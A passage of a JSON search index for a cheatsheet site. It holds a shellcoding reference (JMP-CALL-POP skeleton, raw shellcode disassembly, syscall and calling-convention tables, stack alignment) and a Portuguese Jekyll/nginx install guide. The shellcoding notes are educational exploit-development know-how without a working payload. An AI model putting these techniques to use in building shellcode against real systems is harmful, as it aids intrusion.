Shellcoding\\n\"\ntexto[::-1]\nlen(texto[::-1])\ntexto[::-1].encode('hex')\n</code></pre>\n\n<h3 id=\"asm-to-jmp-call-pop\">ASM to JMP, CALL, POP</h3>\n<p>This sample can be used to generate: Shellcode or ELF</p>\n<pre><code class=\"language-assembly\">[BITS 32]\nglobal _start\nsection .text\n_start:\n    jmp step1\nstep2:\n    pop ecx ; Save text addr at ECX\n    nop\n    ; Other instructions\nstep1:\n    call step2                  \n    db \"Treinamento Shellcoding\", 0x0a, 0x00\n</code></pre>\n\n<h3 id=\"debug-symbols\">Debug Symbols</h3>\n<p>Extract debug symbol from an binary executable file</p>\n<pre><code class=\"language-bash\">objcopy --only-keep-debug [elf_file] symbols.debug\n</code></pre>\n\n<p>Use debug symbol insed of GDB</p>\n<pre><code class=\"language-bash\">(gdb) symbol-file symbols.debug\n</code></pre>\n\n<h3 id=\"disassemble-raw-file-shellcoding\">Disassemble raw file (shellcoding)</h3>\n<p>32 bits</p>\n<pre><code class=\"language-bash\">objdump -D -Mintel,i386 -b binary -m i386 shellcode.bin\n</code></pre>\n\n<p>64 bits</p>\n<pre><code class=\"language-bash\">objdump -D -Mintel,x86-64 -b binary -m i386 shellcode.bin\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"calling-convention\">Calling convention</h2>\n\n<h3 id=\"syscall-linux-32-bits\">Syscall Linux 32 bits</h3>\n<p>When using syscall the parameters must be passed using registers. Return value, when exists, will be stored at <code>EAX</code>.</p>\n\n<p>Follows pseudo-function:</p>\n<pre><code class=\"language-jsx\">eax = func1(ebx, ecx, edx, esi, edi)\n</code></pre>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>eax</code></td>\n      <td>Syscall number</td>\n    </tr>\n    <tr>\n      <td><code>ebx</code></td>\n      <td>1st parameter</td>\n    </tr>\n    <tr>\n      <td><code>ecx</code></td>\n      <td>2nd parameter</td>\n    </tr>\n    <tr>\n      <td><code>edx</code></td>\n      <td>3rd parameter</td>\n    </tr>\n    <tr>\n      <td><code>esi</code></td>\n      <td>4th parameter</td>\n    </tr>\n    <tr>\n      <td><code>edi</code></td>\n      <td>5th parameter</td>\n    </tr>\n  </tbody>\n</table>\n\n<p>Syscall number can be found at: /usr/include/x86_64-linux-gnu/asm/unistd_32.h\nFunction desription can be fount with command <code>man 2 [function_name]</code></p>\n\n<h3 id=\"syscall-linux-64-bits\">Syscall Linux 64 bits</h3>\n<p>When using syscall the parameters must be passed using registers. Return value, when exists, will be stored at <code>RAX</code>.</p>\n\n<p>Follows pseudo-function:</p>\n<pre><code class=\"language-jsx\">eax = func1(rdi, rsi, rdx, r10, r8, r9)\n</code></pre>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>rax</code></td>\n      <td>Syscall number</td>\n    </tr>\n    <tr>\n      <td><code>rdi</code></td>\n      <td>1st parameter</td>\n    </tr>\n    <tr>\n      <td><code>rsi</code></td>\n      <td>2nd parameter</td>\n    </tr>\n    <tr>\n      <td><code>rdx</code></td>\n      <td>3rd parameter</td>\n    </tr>\n    <tr>\n      <td><code>r10</code></td>\n      <td>4th parameter</td>\n    </tr>\n    <tr>\n      <td><code>r8</code></td>\n      <td>5th parameter</td>\n    </tr>\n    <tr>\n      <td><code>r9</code></td>\n      <td>6th parameter</td>\n    </tr>\n  </tbody>\n</table>\n\n<p>Syscall number can be found at: /usr/include/x86_64-linux-gnu/asm/unistd_64.h\nFunction desription can be fount with command <code>man 2 [function_name]</code></p>\n\n<h3 id=\"windows-and-linux-32-bits-stack\">Windows and Linux 32 bits stack</h3>\n<p>All parameters must be pushed onto stack. Remember that parameters must be pushed in reverse order.</p>\n\n<p>Return value, when exists, will be stored at <code>EAX</code>.</p>\n\n<p>Follows pseudo-function:</p>\n<pre><code class=\"language-jsx\">eax = func1(ESP, ESP + 0x04, ESP + 0x08, ...)\n</code></pre>\n\n<table>\n  <thead>\n    <tr>\n      <th>Stack Position</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>esp + 0x00</code></td>\n      <td>1st parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x04</code></td>\n      <td>2nd parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x08</code></td>\n      <td>3rd parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x0C</code></td>\n      <td>4th parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x10</code></td>\n      <td>5th parameter</td>\n    </tr>\n    <tr>\n      <td>…</td>\n      <td>Other parameter</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"windows-and-linux-64-bits\">Windows and Linux 64 bits</h3>\n<p>When using ABI API the parameters must be passed using registers. Return value, when exists, will be stored at <code>RAX</code>.</p>\n\n<p>Follows pseudo-function:</p>\n<pre><code class=\"language-jsx\">eax = func1(int a, int b, int c, int d, int e)\n// a on RCX, b on RDX, c on R8, d on R9, e pushed onto stack\n</code></pre>\n<p>Where:</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register / Stack Position</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>rcx</code></td>\n      <td>1st parameter</td>\n    </tr>\n    <tr>\n      <td><code>rdx</code></td>\n      <td>2nd parameter</td>\n    </tr>\n    <tr>\n      <td><code>r8</code></td>\n      <td>3rd parameter</td>\n    </tr>\n    <tr>\n      <td><code>r9</code></td>\n      <td>4th parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x00</code></td>\n      <td>5th parameter</td>\n    </tr>\n    <tr>\n      <td><code>esp + 0x04</code></td>\n      <td>6th parameter</td>\n    </tr>\n    <tr>\n      <td>…</td>\n      <td>Other parameter</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"amd64-application-binary-interface-abi\">AMD64 Application Binary Interface (ABI)</h3>\n<p>This section describes the standard processes and conventions that one function (the caller) uses to make calls into another function (the callee) in x64 code</p>\n\n<ul>\n  <li>Alignment\n    <ul>\n      <li>The stack must be 16-byte aligned</li>\n    </ul>\n  </li>\n  <li>Argument passing\n    <ul>\n      <li>RCX, RDX, R8, R9, remaining arguments get pushed on the stack in right-to-left order</li>\n    </ul>\n  </li>\n  <li>Shadow space\n    <ul>\n      <li>Must exists an strict one-to-one correspondence between a function call’s arguments and the registers used for those arguments</li>\n    </ul>\n  </li>\n  <li>Return\n    <ul>\n      <li>A scalar return value that can fit into 64 bits is returned through RAX</li>\n    </ul>\n  </li>\n</ul>\n\n<p>See: <a href=\"https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019\" target=\"_blank\">x64 calling convention</a></p>\n\n<h3 id=\"asm-64-bits-tricks\">ASM 64 bits tricks</h3>\n<pre><code class=\"language-assembly\">[BITS 64]\nglobal _start\nsection .text\n_start:\n    ; This 2 instructions must be always present at start of an shellcode\n    cld                         ; Clear direction flag\n    and rsp, 0xFFFFFFFFFFFFFFF0 ; Align stack at 16-byte\n\n    ; Creating one shadow space (without NULL Byte)\n    xor eax,eax                 ; Fill EAX with Zero\n    push eax                    ; Push 0x00 onto stack\n</code></pre>\n\n<h2 class=\"-one-column\" id=\"also-see\">Also see</h2>\n\n<ul>\n  <li><a href=\"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html\" target=\"_blank\">Intel® 64 and IA-32 Architectures Software Developer Manuals</a> <em>(software.intel.com)</em></li>\n  <li><a href=\"https://www.youtube.com/watch?v=ySKEF8MHcZA\" target=\"_blank\">Free Training Shellcoding for 64 bits - Brazilian Language</a> <em>(YouTube)</em></li>\n</ul>",
  "intro_html": "",
  "description_html": "",
  "tags": ["Featured"],
  "updated": "2020-07-30"
},{
  "id": "assets/css/style.css",
  "title": null,
  "url": "/assets/css/style.css",
  "category": "Others",
  "keywords": null,
  "content_html": "<p>@import “jekyll-theme-primer”;</p>",
  "intro_html": "",
  "description_html": "",
  "tags": null,
  "updated": null
},{
  "id": "redirects.json",
  "title": null,
  "url": "/redirects.json",
  "category": "Others",
  "keywords": null,
  "content_html": "<p>{}</p>",
  "intro_html": "",
  "description_html": "",
  "tags": null,
  "updated": null
},{
  "id": "INSTALL",
  "title": "Cheatsheet",
  "url": "/INSTALL",
  "category": "Others",
  "keywords": null,
  "content_html": "<h1 id=\"cheatsheet\">Cheatsheet</h1>\n\n<p>Demonstro aqui como compilar e gerar os HTMLs estáticos dos Cheat Sheets.</p>\n\n<h2 id=\"instale-as-dependências\">Instale as dependências</h2>\n<pre><code># echo deb http://nginx.org/packages/mainline/ubuntu/ `lsb_release --codename --short` nginx &gt; /etc/apt/sources.list.d/nginx.list\n# curl -s http://nginx.org/keys/nginx_signing.key | apt-key add -\n# echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list\n# curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -\n# apt-get update &amp;&amp; apt-get -y upgrade\n# apt install nginx ruby-full build-essential zlib1g-dev yarn\n# gem install jekyll bundler jekyll-theme-primer\n</code></pre>\n\n<h2 id=\"configure-o-ambiente-do-usuário\">Configure o ambiente do usuário</h2>\n<pre><code># clone git clone https://github.com/sec4us-training/cheatsheets.git\n# cd cheatsheets\n# yarn install\n# bundle install\n# bundle update i18n\n</code></pre>\n\n<h2 id=\"gere-os-arquivos-html\">Gere os arquivos HTML</h2>\n<pre><code>Execute o comando abaixo para gerar todo o conteúdo do site\nEste processo atualizará o /assets/packed/ e _includes/2017/critical/ com as fontes em _parcel/\n\nyarn build\n</code></pre>\n\n<h2 id=\"gere-os-arquivos-html-de-produção\">Gere os arquivos HTML de produção</h2>\n<pre><code>JEKYLL_ENV=production bundle exec jekyll build\n</code></pre>\n\n<h2 id=\"copie-os-arquivos-para-o-local-de-publicação-do-site\">Copie os arquivos para o local de publicação do site</h2>\n<p>Supondo que o site está hospedado em /var/www/cheatsheets/</p>\n<pre><code>rsync -av cheatsheets/_site/* /var/www/cheatsheets/\n</code></pre>\n\n<h2 id=\"edite-o-arquivo-do-nginx-etcnginxnginxconf-conforme-abaixo\">Edite o arquivo do NGINX (/etc/nginx/nginx.conf) conforme abaixo</h2>\n<pre><code>user  nginx;\nworker_processes  1;\n \nerror_log  /var/log/nginx/error.log warn;\npid        /var/run/nginx.pid;\n \n \nevents {\n    worker_connections  1024;\n}\n \n \nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n \n    limit_conn_zone $binary_remote_addr zone=addr:10m;\n    server_names_hash_bucket_size  256;\n \n    client_max_body_size 10m;\n \n    log_format log_standard '$remote_addr, $http_x_forwarded_for - $remote_user [$time_local] \"$request_method $scheme://$host$request_uri $server_protocol\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\" to: $upstream_addr';\n \n    access_log /var/log/nginx/access.log log_standard;\n    error_log /var/log/nginx/error.log;\n \n    sendfile        on;\n    #tcp_nopush     on;\n \n    keepalive_timeout  65;\n \n    #gzip  on;\n \n    include /etc/nginx/conf.d/*.conf;\n}\n</code></pre>\n\n<h2 id=\"edite-o-arquivo-do-host-nginx-etcnginxconfddefaultconf-conforme-abaixo\">Edite o arquivo do host NGINX (/etc/nginx/conf.d/default.conf) conforme abaixo</h2>\n<pre><code>server {\n    listen      80;\n    server_name _;\n \n   location / {\n        root /var/www/cheatsheets/;\n\n        if (!-f \"${request_filename}index.html\") {\n            rewrite ^/(.*)/$ /$1 permanent;\n        }\n\n        if ($request_uri ~* \"/index.html\") {\n            rewrite (?i)^(.*)index\\.html$ $1 permanent;\n        }   \n\n        if ($request_uri ~* \".html\") {\n            rewrite (?i)^(.*)/(.*)\\.html $1/$2 permanent;\n        }\n\n        try_files $uri.html $uri $uri/ /index.html;\n   }\n \n}\n</code></pre>\n\n<h2 id=\"recarregue-a-config-do-nginx\">Recarregue a config do NGINX</h2>\n<pre><code># nginx -s reload\n</code></pre>\n\n<h2 id=\"agradecimentos\">Agradecimentos</h2>\n<p>Agradeço ao <a href=\"https://ricostacruz.com/\">@rstacruz</a> criador do site <a href=\"https://devhints.io/\">devhints.io</a> pelo trabalho e apoio neste processo de criação do site.</p>\n\n<h2 id=\"fontes-de-estudo\">Fontes de estudo</h2>\n<p>https://gist.github.com/rickharrison/6410194\nhttps://www.digitalocean.com/community/tutorials/how-to-get-started-with-jekyll-on-an-ubuntu-vps\nhttps://yuan3y.com/2017/09/make-jekyll-serve-a-systemd-service/\nhttps://github.com/rstacruz/cheatsheets/blob/master/CONTRIBUTING.md</p>",
  "intro_html": "",
  "description_html": "",
  "tags": null,
  "updated": null
}
]

